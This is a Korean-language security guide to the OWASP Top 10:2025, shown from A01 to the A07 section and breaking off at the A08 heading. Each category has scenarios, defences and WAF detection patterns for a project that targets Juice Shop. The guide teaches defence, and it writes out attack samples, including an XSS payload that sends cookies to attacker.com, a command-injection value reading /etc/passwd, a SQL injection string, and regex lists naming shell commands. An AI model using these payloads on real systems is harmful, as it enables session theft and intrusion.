# OWASP Top 10:2025 — 웹 애플리케이션 보안 취약점 상세 가이드

> **기준:** [OWASP Top 10:2025](https://owasp.org/Top10/2025/) 공식 문서  
> **프로젝트 연계:** AI Security System (FastAPI WAF 리버스 프록시 + Mistral-7B LLM)  
> **대상 타겟:** OWASP Juice Shop (의도적 취약 웹 앱)  
> **최종 수정:** 2026-03-26

---

## 목차

| # | ID | 항목명 | 순위 변동 |
|---|-----|--------|----------|
| 1 | [A01:2025](#a012025--broken-access-control-취약한-접근-제어) | Broken Access Control | ▲ 유지 (#1) |
| 2 | [A02:2025](#a022025--security-misconfiguration-보안-설정-오류) | Security Misconfiguration | ▲ 상승 (#5→#2) |
| 3 | [A03:2025](#a032025--software-supply-chain-failures-소프트웨어-공급망-실패) | Software Supply Chain Failures | ★ 확장 재정의 |
| 4 | [A04:2025](#a042025--cryptographic-failures-암호화-실패) | Cryptographic Failures | ▼ 하락 (#2→#4) |
| 5 | [A05:2025](#a052025--injection-인젝션) | Injection | ▼ 하락 (#3→#5) |
| 6 | [A06:2025](#a062025--insecure-design-안전하지-않은-설계) | Insecure Design | ▼ 하락 (#4→#6) |
| 7 | [A07:2025](#a072025--authentication-failures-인증-실패) | Authentication Failures | — 유지 (#7) |
| 8 | [A08:2025](#a082025--software-or-data-integrity-failures-소프트웨어-및-데이터-무결성-실패) | Software or Data Integrity Failures | — 유지 (#8) |
| 9 | [A09:2025](#a092025--security-logging-and-alerting-failures-보안-로깅-및-알림-실패) | Security Logging and Alerting Failures | — 유지 (#9) |
| 10 | [A10:2025](#a102025--mishandling-of-exceptional-conditions-예외-조건-오처리) | Mishandling of Exceptional Conditions | ★ 신규 |

---

## OWASP Top 10이란?

OWASP(Open Web Application Security Project)가 발행하는 웹 애플리케이션 보안 위협 인식 문서로, 가장 중요한 10가지 보안 위험을 순위로 정리한다. 개발자·보안 담당자·운영팀이 보안을 이해하고 적용하기 위한 **사실상의 업계 표준**이다.

### 2021 → 2025 주요 변경점

```
2021 목록                            2025 목록
─────────────────────────────────────────────────────
A01: Broken Access Control           A01: Broken Access Control     ← 유지
A02: Cryptographic Failures          A02: Security Misconfiguration ← 상승 (5위→2위)
A03: Injection                       A03: Software Supply Chain     ← 신규 확장
A04: Insecure Design                 A04: Cryptographic Failures    ← 하락 (2위→4위)
A05: Security Misconfiguration       A05: Injection                 ← 하락 (3위→5위)
A06: Vulnerable & Outdated Comp.     A06: Insecure Design           ← 하락 (4위→6위)
A07: Identification & Auth. Failures A07: Authentication Failures   ← 유지
A08: Software & Data Integrity       A08: Software/Data Integrity   ← 유지
A09: Security Logging Failures       A09: Security Logging/Alerting ← 알림 강조
A10: SSRF                            A10: Mishandling of Excpt. Cond← 신규
─────────────────────────────────────────────────────
```

> **A03의 핵심 변화:** "Vulnerable and Outdated Components"에서 **"Software Supply Chain Failures"** 로 범위가 크게 확장됨. 알려진 취약점뿐 아니라 공급망 전체 생애주기의 실패를 포함한다.

---

## A01:2025 — Broken Access Control (취약한 접근 제어)

> **5회 연속 1위** | CWE 40개 매핑 | 테스트된 애플리케이션 **100%**에서 발견

### 개요

접근 제어는 사용자가 의도된 권한 밖의 행동을 할 수 없도록 정책을 강제하는 메커니즘이다. 이 메커니즘이 실패하면 **비인가 정보 노출, 데이터 수정·삭제, 비즈니스 기능 남용**이 발생한다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 40개 |
| 최대 발생률 | 20.15% |
| 평균 발생률 | 3.74% |
| 총 발생 건수 | 1,839,701건 |
| 관련 CVE 수 | 32,654개 |

### 취약점 유형

```
┌─────────────────────────────────────────────────────────┐
│                   접근 제어 취약점 유형                      │
├─────────────────────────────────────────────────────────┤
│ 1. 최소 권한 원칙 위반 (Least Privilege Violation)         │
│    → 기본 허용(Allow by Default) 설정                       │
│                                                         │
│ 2. URL 변조를 통한 우회 (Force Browsing)                    │
│    → /admin_dashboard 직접 접근                            │
│                                                         │
│ 3. IDOR (Insecure Direct Object References)             │
│    → ?id=1234 → ?id=1235 로 타인 데이터 열람               │
│                                                         │
│ 4. API 메서드 남용                                          │
│    → GET은 제한되지만 POST/PUT/DELETE 접근 통제 미적용       │
│                                                         │
│ 5. 권한 상승 (Privilege Escalation)                        │
│    → 일반 사용자가 관리자 기능 실행                           │
│                                                         │
│ 6. JWT/쿠키/숨김 필드 조작                                  │
│    → 토큰의 role 필드를 user → admin 으로 변조              │
│                                                         │
│ 7. CORS 오설정                                             │
│    → 신뢰되지 않는 출처에서의 API 접근 허용                   │
│                                                         │
│ 8. CSRF (Cross-Site Request Forgery)                    │
│    → 사용자 의도 없는 요청 위조 실행                         │
│                                                         │
│ 9. SSRF (Server-Side Request Forgery)                   │
│    → 서버가 내부 리소스에 대리 요청 수행                      │
└─────────────────────────────────────────────────────────┘
```

### 공격 시나리오

**시나리오 1: IDOR를 통한 타인 계좌 접근**
```http
GET /app/accountInfo?acct=notmyacct HTTP/1.1

# 검증 없이 acct 파라미터로 임의 계좌 조회 가능
# 공격자는 acct 값을 바꿔가며 모든 사용자 정보 열람
```

**시나리오 2: 강제 브라우징 (Force Browsing)**
```
https://example.com/app/getappInfo       ← 정상 접근
https://example.com/app/admin_getappInfo ← 관리자 페이지 직접 접근
```

**시나리오 3: 프론트엔드 우회**
```bash
# JavaScript가 관리자 페이지 링크를 숨겨도
curl https://example.com/app/admin_getappInfo
# 서버 측 검증 없으면 직접 접근 가능
```

### 방어 방법

- **서버 측에서만** 접근 제어 구현 (프론트엔드 의존 금지)
- **공개 리소스 외 기본 거부 (Deny by Default)** 정책 적용
- 접근 제어 메커니즘을 **한 곳에서만 구현**하고 전체 애플리케이션에 재사용
- 레코드 **소유권 기반** 모델 접근 제어 (사용자는 자신의 데이터만)
- 디렉터리 리스팅 비활성화, `.git`·백업 파일 웹 루트 제외
- 접근 제어 실패 **로깅 및 반복 실패 시 관리자 알림**
- API 및 컨트롤러에 **레이트 리밋** 적용
- 로그아웃 시 세션 ID 서버에서 즉시 무효화, JWT는 단기 유효기간 설정

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a01.py 탐지 포인트
탐지_대상 = [
    "경로 순회 시도: ../../../etc/passwd",
    "관리자 경로 접근: /admin, /dashboard, /management",
    "IDOR 패턴: ?id=숫자 → 타인 ID 추측 반복 요청",
    "HTTP 메서드 남용: OPTIONS, TRACE 활성화 여부",
    "JWT alg:none 공격 또는 역할 필드 변조",
    "CORS Origin 헤더 위조 요청",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-22 | 경로 순회 (Path Traversal) |
| CWE-284 | 부적절한 접근 제어 |
| CWE-285 | 부적절한 인가 |
| CWE-352 | CSRF |
| CWE-639 | 사용자 제어 키를 통한 인가 우회 (IDOR) |
| CWE-862 | 인가 누락 |
| CWE-918 | SSRF |

---

## A02:2025 — Security Misconfiguration (보안 설정 오류)

> **2021년 5위 → 2025년 2위 대폭 상승** | 테스트된 애플리케이션 **100%**에서 발견

### 개요

시스템·애플리케이션·클라우드 서비스가 보안 관점에서 **잘못 설정**된 상태. 고도로 설정 가능한 소프트웨어의 증가로 이 카테고리의 중요성이 크게 높아졌다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 16개 |
| 최대 발생률 | 27.70% |
| 평균 발생률 | 3.00% |
| 총 발생 건수 | 719,084건 |

### 취약한 상태 징후

```
□ 스택 전반에 걸친 보안 강화 미적용
□ 불필요한 포트·서비스·페이지·계정·테스트 프레임워크 활성화
□ 기본 계정 및 비밀번호 미변경 상태 유지
□ 스택 트레이스·상세 오류 메시지 사용자에게 노출
□ 업그레이드된 시스템의 최신 보안 기능 비활성화
□ 하위 호환성 우선으로 인한 불안전한 설정 유지
□ 프레임워크·라이브러리·DB의 보안 설정값 미적용
□ 보안 헤더 미설정 (Content-Security-Policy, X-Frame-Options 등)
□ 클라우드 스토리지 공개 접근 허용 (예: S3 버킷 퍼블릭)
```

### 공격 시나리오

**시나리오 1: 기본 자격증명 그대로 사용**
```
관리자 콘솔이 기본 계정(admin/admin)으로 접근 가능
→ 공격자가 로그인 후 서버 완전 장악
```

**시나리오 2: 디렉터리 리스팅 활성화**
```
GET /backup/ HTTP/1.1

HTTP/1.1 200 OK
Index of /backup
  database_dump_2025.sql
  config.bak
  .env.old
```

**시나리오 3: 상세 오류 메시지 노출**
```json
{
  "error": "NullPointerException at com.example.UserService:142",
  "stack": "org.springframework.jdbc.BadSqlGrammarException...",
  "query": "SELECT * FROM users WHERE id='...'",
  "database": "PostgreSQL 14.2 on x86_64-pc-linux-gnu"
}
```

**시나리오 4: 클라우드 공개 버킷**
```bash
# AWS S3 버킷이 퍼블릭으로 설정된 경우
curl https://company-backup.s3.amazonaws.com/
# → 전체 파일 목록 및 다운로드 가능
```

### 방어 방법

- **반복 가능한 강화 프로세스** 구축 (개발·QA·운영 환경 동일 설정, 자격증명만 상이)
- **최소 플랫폼 원칙**: 불필요한 기능·컴포넌트·문서·샘플 제거
- **정기적 설정 검토**: 보안 노트·업데이트·패치에 맞춰 설정 갱신
- **세그멘테이션**: 컴포넌트·테넌트 간 효과적 분리 (컨테이너화, 보안 그룹)
- 클라이언트에 **보안 헤더 전송** (HSTS, CSP, X-Frame-Options 등)
- **자동화 검증**: 모든 환경의 설정 유효성 자동 점검
- 정적 키·시크릿을 코드·설정 파일에 **하드코딩 금지** (IAM 역할·단기 자격증명 사용)

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a02.py 탐지 포인트
탐지_대상 = [
    "민감 경로 접근: /.env, /.git, /config, /backup, /phpinfo.php",
    "응답의 스택 트레이스 노출 (Server: Apache/2.4.1 등 버전 정보)",
    "위험한 응답 헤더 부재: X-Frame-Options, X-Content-Type-Options",
    "CORS 와일드카드: Access-Control-Allow-Origin: *",
    "XXE 가능한 Content-Type: application/xml 요청",
    "기본 자격증명 사용 탐지: admin/admin, root/root",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-16 | 설정 오류 |
| CWE-489 | 활성 디버그 코드 |
| CWE-611 | XXE (XML 외부 개체 참조) |
| CWE-942 | 신뢰되지 않는 도메인에 대한 허용적 CORS 정책 |
| CWE-1004 | HttpOnly 플래그 없는 민감 쿠키 |

---

## A03:2025 — Software Supply Chain Failures (소프트웨어 공급망 실패)

> **커뮤니티 설문 1위 (50% 응답자 선택)** | 2021년 "취약하고 오래된 컴포넌트"에서 **범위 대폭 확장**

### 개요

소프트웨어 공급망 실패란 소프트웨어의 **빌드·배포·업데이트 과정**에서 발생하는 장애 또는 손상이다. 서드파티 코드·도구·의존성의 취약점이나 악의적 변조로 발생한다. 2021년의 "취약하고 오래된 컴포넌트"를 포함하면서도 **알려지지 않은 공급망 실패 전반**으로 범위가 확장되었다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 6개 |
| 평균 발생률 | 5.72% (전 카테고리 중 **최고**) |
| 최대 발생률 | 9.56% |

### 실제 공격 사례

```
┌─────────────────────────────────────────────────────────┐
│               역대 주요 공급망 공격 사례                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ SolarWinds (2019)                                       │
│  → IT 관리 소프트웨어 업데이트에 백도어 삽입               │
│  → 18,000개 조직 감염 (미국 정부 기관 포함)               │
│                                                         │
│ Bybit 암호화폐 거래소 (2025)                              │
│  → 지갑 소프트웨어 공급망 공격                              │
│  → 15억 달러 상당 암호화폐 탈취                            │
│                                                         │
│ Shai-Hulud npm 웜 (2025)                                │
│  → npm 패키지 생태계 자기 전파 웜 최초 성공                 │
│  → 500개 이상 패키지 버전 감염, 민감 데이터 유출             │
│                                                         │
│ Log4Shell (CVE-2021-44228)                              │
│  → Apache Log4j 라이브러리 RCE 취약점                     │
│  → 전 세계 수백만 시스템 영향                              │
└─────────────────────────────────────────────────────────┘
```

### 취약한 상태 징후

```
□ 직접·전이적 의존성 버전 추적 미실시
□ 취약하거나 지원 종료된 OS·프레임워크·라이브러리 사용
□ 정기적 취약점 스캔 미실시, CVE 알림 미구독
□ 공급망 변경사항 추적 프로세스 부재
□ 최소 권한 원칙 미적용 (모든 공급망 구성요소에)
□ 개발자 역할 분리 없음 (코드 작성→프로덕션 배포 단일 인물)
□ 신뢰되지 않는 출처의 컴포넌트 사용
□ 위험 기반 패치 프로세스 부재 (월별·분기별 패치)
□ CI/CD 파이프라인 보안 취약
```

### 방어 방법

- **SBOM(소프트웨어 자재 명세서)** 중앙 관리
- 직접·전이적 의존성 **모두** 추적
- 미사용 의존성·기능·파일·문서 제거 (공격 표면 최소화)
- **OWASP Dependency-Track**, retire.js 등으로 지속적 취약점 모니터링
- **공식 소스에서만** 서명된 패키지 사용
- **단계적 배포(Staged Rollout)** — 신뢰된 벤더 침해 시 피해 최소화
- CI/CD·IDE·개발자 워크스테이션 정기 업데이트
- 코드 리포지토리, 빌드 서버, 아티팩트 저장소에 **MFA 및 IAM 강화**

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a03.py 탐지 포인트
탐지_대상 = [
    "외부 CDN 스크립트 참조 (응답 본문): cdn.attacker.com/script.js",
    "의심스러운 서드파티 도메인으로의 리소스 요청",
    "알려진 취약 버전 헤더: Server: Apache/2.2.x",
    "패키지 레지스트리 우회 시도 (내부망 경유 외부 패키지 요청)",
    "HTTP 응답 내 외부 JS/CSS 출처 무결성 속성(SRI) 미적용 탐지",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-1104 | 유지보수되지 않는 서드파티 컴포넌트 사용 |
| CWE-1329 | 업데이트 불가 컴포넌트 의존 |
| CWE-1395 | 취약한 서드파티 컴포넌트 의존 |

---

## A04:2025 — Cryptographic Failures (암호화 실패)

> **2021년 2위 → 2025년 4위** | CWE 32개 매핑 | 취약한 난수 생성기가 핵심 원인

### 개요

암호화 부재·불충분한 암호화 강도·암호화 키 누출 및 관련 오류. 데이터의 **기밀성·무결성 보호 실패**로 이어진다. 특히 민감 데이터(비밀번호·신용카드·의료정보·개인정보)는 GDPR·PCI DSS 등 법적 요구사항과도 연결된다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 32개 |
| 최대 발생률 | 13.77% |
| 평균 발생률 | 3.80% |
| 총 발생 건수 | 1,665,348건 |

### 취약한 상태 점검 목록

```
□ 구식·취약한 암호화 알고리즘 사용 (MD5, SHA1, DES, ECB 모드)
□ 기본 암호화 키 사용, 취약한 키 생성, 키 재사용
□ 소스 코드 저장소에 암호화 키 커밋
□ HTTP → HTTPS 강제 미적용, HSTS 헤더 없음
□ 서버 인증서 및 신뢰 체인 미검증
□ 초기화 벡터(IV) 재사용 또는 무작위성 부족
□ 패스워드를 암호화 키로 직접 사용 (KDF 미사용)
□ 암호학적 목적에 비암호학적 난수 생성기 사용
□ 취약한 해시 함수 사용 (MD5, SHA1)
□ CBC 패딩 오라클 공격 취약점
□ TLS 1.0/1.1 지원 (TLS 1.2+ 미강제)
□ FTP, SMTP 등 평문 프로토콜 사용
□ 비밀번호를 Bcrypt 없이 단순 해시로 저장
□ 포스트 퀀텀 암호화(PQC) 준비 부재
```

### 공격 시나리오

**시나리오 1: HTTPS 미적용 → 중간자 공격**
```
공격자 (Wi-Fi 스니핑)
     ↓ HTTP 다운그레이드
HTTPS → HTTP 강제 전환
     ↓ 세션 쿠키 탈취
피해자 계정 하이재킹
```

**시나리오 2: 취약한 비밀번호 해싱**
```sql
-- 취약: MD5 단순 해시
SELECT * FROM users WHERE pw_hash = MD5('password');

-- 안전: bcrypt/Argon2 적용
-- $argon2id$v=19$m=65536,t=3,p=4$salt$hash
```

**시나리오 3: 암호화 키 하드코딩**
```python
# 위험: 소스코드에 키 노출
SECRET_KEY = "mysupersecretkey123"
JWT_SECRET = "do-not-use-in-production"

# 안전: 환경변수 또는 HSM에서 로드
SECRET_KEY = os.environ["SECRET_KEY"]
```

### 방어 방법

- 민감 데이터 **분류 및 레이블링** — 필요 데이터만 수집·저장
- 민감 키는 **하드웨어/클라우드 HSM**에 저장
- **TLS 1.2+** 및 순방향 비밀성(FS) 암호화, HSTS 적용
- 비밀번호는 **Argon2, yescrypt, scrypt, PBKDF2** 등 적응형 해시 사용
- **AES-GCM** 등 인증된 암호화(Authenticated Encryption) 사용
- **민감 응답 캐싱 비활성화** (CDN, 웹서버, Redis 포함)
- MD5·SHA1·CBC·PKCS#1 v1.5 등 **deprecated 알고리즘 제거**
- 2030년까지 **포스트 퀀텀 암호화(PQC)** 대비 (NIST 표준 ML-KEM, ML-DSA)

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a04.py 탐지 포인트
탐지_대상 = [
    "HTTP(비암호화) 전송에서 민감 파라미터 평문 포함: password=xxx",
    "Set-Cookie: Secure 플래그 없음 (응답 스캔)",
    "Set-Cookie: HttpOnly 플래그 없음 (응답 스캔)",
    "Set-Cookie: SameSite 속성 미설정 (응답 스캔)",
    "응답 헤더: Strict-Transport-Security 없음",
    "약한 TLS 협상 시도 (TLS 1.0/1.1)",
    "알고리즘 다운그레이드 공격 시도",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-319 | 민감 정보 평문 전송 |
| CWE-321 | 하드코딩된 암호화 키 |
| CWE-327 | 취약하거나 위험한 암호화 알고리즘 사용 |
| CWE-331 | 불충분한 엔트로피 |
| CWE-338 | 암호학적으로 취약한 PRNG 사용 |
| CWE-759 | 솔트 없는 단방향 해시 |
| CWE-916 | 연산 비용 불충분한 비밀번호 해시 |

---

## A05:2025 — Injection (인젝션)

> **2021년 3위 → 2025년 5위** | CWE **37개** 매핑 | CVE 수 **62,445개** (전 카테고리 중 최다)

### 개요

인젝션 취약점은 **신뢰되지 않는 사용자 입력이 인터프리터(브라우저·DB·커맨드라인)로 전달**되어 인터프리터가 그 입력의 일부를 명령으로 실행할 때 발생한다. XSS(30,000+ CVE)와 SQL Injection(14,000+ CVE)이 가장 흔하다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 37개 |
| 최대 발생률 | 13.77% |
| 평균 발생률 | 3.08% |
| 총 발생 건수 | 1,404,249건 |
| 관련 CVE 수 | **62,445개** |

### 인젝션 유형

```
┌──────────────────────────────────────────────────────────┐
│                    인젝션 공격 유형 분류                      │
├────────────────────┬─────────────────────────────────────┤
│ SQL Injection      │ DB 쿼리에 악성 SQL 삽입              │
│ NoSQL Injection    │ MongoDB 등 NoSQL 쿼리 조작           │
│ OS Command Injection│ 시스템 명령어 실행                  │
│ LDAP Injection     │ 디렉터리 서비스 쿼리 조작            │
│ XPath Injection    │ XML 데이터 쿼리 조작                 │
│ ORM Injection      │ 객체-관계형 매핑 쿼리 조작           │
│ Expression Language│ EL/OGNL 표현식 인젝션               │
│ Cross-Site Scripting│ 브라우저에 악성 스크립트 삽입       │
│ CRLF Injection     │ HTTP 헤더 분할 공격                  │
│ Template Injection │ 서버 사이드 템플릿 엔진 악용         │
│ LLM Prompt Injection│ LLM 프롬프트 조작 (신규)           │
└────────────────────┴─────────────────────────────────────┘
```

### 취약한 코드 vs 안전한 코드

**SQL Injection**
```java
// 취약: 문자열 연결
String query = "SELECT * FROM accounts WHERE custID='" 
               + request.getParameter("id") + "'";
// 공격: id = ' OR '1'='1  → 전체 레코드 반환

// 안전: PreparedStatement 사용
PreparedStatement pstmt = con.prepareStatement(
    "SELECT * FROM accounts WHERE custID=?");
pstmt.setString(1, request.getParameter("id"));
```

**OS Command Injection**
```java
// 취약: 사용자 입력을 OS 명령에 직접 삽입
String cmd = "nslookup " + request.getParameter("domain");
Runtime.getRuntime().exec(cmd);
// 공격: domain = example.com; cat /etc/passwd

// 안전: 허용 목록(Allowlist) 검증
String domain = request.getParameter("domain");
if (!domain.matches("[a-zA-Z0-9.-]+")) {
    throw new IllegalArgumentException("Invalid domain");
}
```

**XSS (Cross-Site Scripting)**
```python
# 취약: 사용자 입력을 그대로 HTML에 삽입
return f"<h1>안녕하세요, {username}님!</h1>"
# 공격: username = <script>document.location='http://attacker.com?c='+document.cookie</script>

# 안전: HTML 이스케이프 처리
from html import escape
return f"<h1>안녕하세요, {escape(username)}님!</h1>"
```

### 방어 방법

- **안전한 API 사용** — 인터프리터 직접 사용 회피, 파라미터화된 쿼리
- ORM 사용 (단, 동적 쿼리 연결 시에도 SQL Injection 주의)
- **허용 목록 기반** 서버 측 입력 검증
- 불가피한 동적 쿼리에서 **인터프리터별 이스케이프 문법** 사용
- **SAST·DAST·IAST** 도구를 CI/CD 파이프라인에 통합
- 퍼징(Fuzzing)으로 모든 파라미터·헤더·URL·쿠키·JSON·XML 테스트

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a05.py 탐지 포인트
import re

SQL_PATTERNS = [
    r"(\bOR\b|\bAND\b)\s+[\w'\"]+\s*=\s*[\w'\"]+",  # OR 1=1
    r"';\s*(DROP|DELETE|INSERT|UPDATE|SELECT)",         # 구문 종료 후 명령
    r"UNION\s+(ALL\s+)?SELECT",                         # UNION 기반 SQLi
    r"--\s*$|#\s*$",                                    # SQL 주석
    r"xp_cmdshell|exec\s+sp_",                          # MSSQL 시스템 함수
]

XSS_PATTERNS = [
    r"<script[^>]*>",                                   # script 태그
    r"javascript\s*:",                                  # javascript: 스킴
    r"on\w+\s*=",                                       # onclick 등 이벤트
    r"<iframe[^>]*>",                                   # iframe 삽입
]

CMD_PATTERNS = [
    r"[;&|`]\s*(ls|cat|whoami|id|uname|passwd)",       # 명령어 체인
    r"\.\./\.\./",                                      # 경로 순회
    r"/etc/(passwd|shadow|hosts)",                      # 시스템 파일 접근
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-78 | OS 명령 인젝션 |
| CWE-79 | XSS (크로스 사이트 스크립팅) |
| CWE-89 | SQL 인젝션 |
| CWE-90 | LDAP 인젝션 |
| CWE-94 | 코드 인젝션 |
| CWE-917 | 표현 언어 인젝션 |

---

## A06:2025 — Insecure Design (안전하지 않은 설계)

> **2021년 4위 → 2025년 6위** | CWE 39개 매핑 | 2021년 신규 도입 카테고리

### 개요

설계 및 아키텍처 결함에서 기인하는 위험. **취약한 구현(Implementation Defect)**과는 다르다 — 안전한 구현도 잘못된 설계를 완전히 고칠 수 없다. 위협 모델링·보안 설계 패턴·참조 아키텍처의 부재가 원인이다.

> **핵심 구분:**  
> - **Insecure Design**: 처음부터 보안 제어가 설계에 포함되지 않음 → 코드가 완벽해도 취약  
> - **Insecure Implementation**: 올바른 설계지만 코드 레벨에서 잘못 구현됨 → 코드 수정으로 해결 가능

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 39개 |
| 최대 발생률 | 22.18% |
| 평균 발생률 | 1.86% |
| 총 발생 건수 | 729,882건 |

### 안전한 설계의 3가지 핵심 요소

```
┌─────────────────────────────────────────────────────────┐
│              안전한 설계의 3가지 핵심 요소                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 1. 요구사항 및 리소스 관리                                    │
│    · 기밀성·무결성·가용성·진정성 보호 요구사항 정의             │
│    · 테넌트 분리 필요 여부 결정                               │
│    · 보안 활동을 포함한 예산 책정                              │
│                                                         │
│ 2. 보안 설계 문화                                            │
│    · 위협 모델링(Threat Modeling)을 개발 사이클에 통합         │
│    · 데이터 흐름·접근 제어 변경 시 위협 재평가                 │
│    · 정상/실패 흐름 모두 명확히 정의                           │
│                                                         │
│ 3. 보안 개발 생애주기 (Secure SDL)                           │
│    · 보안 전문가를 초기 설계부터 참여                          │
│    · OWASP SAMM 활용                                     │
│    · 개발자 보안 책임 문화 조성                               │
└─────────────────────────────────────────────────────────┘
```

### 공격 시나리오

**시나리오 1: 취약한 비밀번호 복구 설계**
```
"보안 질문-답변" 방식의 비밀번호 복구
→ NIST 800-63b에서 금지된 방식
→ 여러 사람이 답을 알 수 있는 질문 (어머니 성함, 출신 학교)
→ 비밀번호 복구 = 신원 증명 불가
```

**시나리오 2: 비즈니스 로직 공격**
```
시나리오: 영화관 단체 예약 할인 시스템
- 정책: 최대 15명까지 보증금 없이 예약 가능
- 공격자: 모든 상영관 좌석(600석)을 초단위 요청 수십 건으로 예약
- 피해: 실제 고객 예약 불가 + 실제 예약 없이 좌석 독점
- 원인: 비즈니스 로직에서 이상 패턴 탐지 설계 누락
```

**시나리오 3: 스캘퍼 봇 공격 (e-commerce)**
```
고가 그래픽카드 출시 → 봇이 수초 내 전량 구매
→ 실제 소비자 구매 불가
→ 원인: 봇 방지 설계 미적용, 구매 속도 제한 없음
```

### 방어 방법

- AppSec 전문가와 함께 **보안·프라이버시 제어 설계 및 검토**
- **보안 설계 패턴 라이브러리** 구축 및 활용
- 인증·접근 제어·비즈니스 로직·핵심 흐름에 **위협 모델링** 적용
- 각 계층에서 **입력 타당성 검사** 통합
- 단위·통합 테스트로 **위협 모델 저항성 검증**
- **오용 사례(Misuse Case)** 작성 — 공격자 관점 설계 검토

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a06.py 탐지 포인트
탐지_대상 = [
    "비즈니스 로직 우회: price=0, quantity=-1, discount=100",
    "역할 파라미터 조작: role=admin, isAdmin=true",
    "한도 우회 시도: 동일 API 단시간 과다 호출",
    "가격·포인트·잔액 파라미터 변조 탐지",
    "토큰/쿠폰 반복 사용 시도",
    "단계 건너뜀: 결제 과정 중 검증 단계 URL 직접 접근",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-269 | 부적절한 권한 관리 |
| CWE-434 | 위험한 유형의 파일 무제한 업로드 |
| CWE-522 | 불충분하게 보호된 자격증명 |
| CWE-602 | 서버 측 보안의 클라이언트 측 강제 |
| CWE-657 | 보안 설계 원칙 위반 |
| CWE-841 | 비즈니스 워크플로우 부적절한 강제 |

---

## A07:2025 — Authentication Failures (인증 실패)

> **2021년 "Identification and Authentication Failures" → 2025년 명칭 변경** | 2위 유지

### 개요

공격자가 시스템을 속여 **유효하지 않은 사용자를 합법적 사용자로 인식**하게 만드는 취약점. 표준화된 프레임워크의 혜택에도 불구하고 2021년과 동일한 7위를 유지하고 있다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 36개 |
| 최대 발생률 | 15.80% |
| 평균 발생률 | 2.92% |
| 총 발생 건수 | 1,120,673건 |

### 취약한 상태 징후

```
□ 크리덴셜 스터핑 방어 없음 (유출된 ID/PW 목록 자동화 시도)
□ 하이브리드 크리덴셜 스터핑 방어 없음
  (예: Winter2025 → Winter2026, Password1! → Password2!)
□ 브루트포스·자동화 공격 미차단
□ 기본·취약·알려진 비밀번호 허용 (admin/admin, Password1)
□ 이미 침해된 크리덴셜로 신규 계정 생성 허용
□ 취약한 비밀번호 복구 (보안 질문)
□ 평문·암호화·약한 해시로 비밀번호 저장 (A04 참조)
□ MFA(다요소 인증) 없음 또는 효과 없는 폴백
□ 세션 ID URL 노출 또는 비안전 위치 저장
□ 로그인 후 세션 ID 재발급 없음 (세션 고정 공격)
□ 로그아웃·비활성 시 세션·SSO 토큰 미무효화
```

### 공격 시나리오

**시나리오 1: 하이브리드 크리덴셜 스터핑**
```
공격자 보유 데이터: 대규모 유출 데이터베이스
     ↓
자동화 공격 시도:
  winter2025 → winter2026
  ILoveMyDog6 → ILoveMyDog7
  P@ssw0rd1  → P@ssw0rd2
     ↓
로그인 시도 속도 제한·MFA 없으면 → 계정 탈취
```

**시나리오 2: 세션 타임아웃 미적용**
```
사용자가 공공 컴퓨터에서 로그인
→ 브라우저 탭 닫기만 하고 로그아웃 없이 이석
→ 다음 사용자가 동일 브라우저 접근
→ 이전 사용자로 인증된 상태 유지
```

**시나리오 3: SSO 단일 로그아웃 실패**
```
SSO로 메일·문서·채팅 동시 로그인
→ 메일 서비스에서만 로그아웃
→ 문서·채팅 서비스는 여전히 인증 상태
→ 동일 컴퓨터 다른 사용자가 잔여 세션 접근
```

### 방어 방법

- **MFA(다요소 인증)** 구현 및 강제 (크리덴셜 스터핑·브루트포스 대응)
- **비밀번호 관리자 사용 권장** (사용자의 강력한 패스워드 선택 지원)
- 기본 자격증명으로 **배포 금지** (특히 관리자 계정)
- **Top 10,000 취약 비밀번호** 목록 대조 검사
- **haveibeenpwned.com** 연동으로 침해된 자격증명 신규 계정 등록 차단
- **NIST 800-63b** 기반 비밀번호 정책 (복잡도보다 길이 우선, 불필요한 주기적 변경 강제 금지)
- 계정 열거 방지: 모든 결과에 **동일한 메시지** 반환 ("이메일 또는 비밀번호가 잘못되었습니다")
- 로그인 실패 **제한 및 지연** (DoS 유발 주의)
- 서버 측 세션 관리: 로그인 후 **새 랜덤 세션 ID** 발급, 로그아웃/타임아웃 시 무효화
- JWT 검증 시 `aud`, `iss`, `scope` 클레임 확인

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a07.py 탐지 포인트
탐지_대상 = [
    "단시간 로그인 반복 실패: 동일 IP에서 N회 이상 (브루트포스)",
    "크리덴셜 스터핑: 다수 계정명 순차 시도",
    "취약한 쿠키: Secure/HttpOnly/SameSite 플래그 없음",
    "JWT 변조 시도: alg:none, 서명 누락, 페이로드 직접 수정",
    "세션 ID URL 포함 요청",
    "비밀번호 복구 엔드포인트 집중 공격",
    "계정 열거: 응답 시간·메시지 차이로 유효 계정 탐지 시도",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-259 | 하드코딩된 비밀번호 |
| CWE-287 | 부적절한 인증 |
| CWE-307 | 과도한 인증 시도 미제한 |
| CWE-384 | 세션 고정 |
| CWE-521 | 취약한 비밀번호 요구사항 |
| CWE-613 | 불충분한 세션 만료 |
| CWE-798 | 하드코딩된 자격증명 |

---

## A08:2025 — Software or Data Integrity Failures (소프트웨어 및 데이터 무결성 실패)

